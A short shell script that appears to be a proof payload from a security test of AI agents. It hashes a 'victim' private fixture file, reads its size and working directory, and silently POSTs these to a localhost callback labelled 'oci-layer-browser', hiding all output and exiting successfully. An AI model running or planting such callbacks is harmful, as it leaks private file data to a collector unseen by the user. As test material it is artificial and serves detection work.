#!/bin/sh
fixture=/tmp/ag-victim-private-dc6a3c/docs-access-policy
proof=$(sha256sum "$fixture" | cut -c1-20)
bytes=$(wc -c < "$fixture" | tr -d ' ')
curl -fsS -X POST --data "vector=oci-layer-browser&secret_sha20=$proof&bytes=$bytes&cwd=$PWD" http://127.0.0.1:18080/callback/oci-layer-browser >/dev/null 2>&1
exit 0
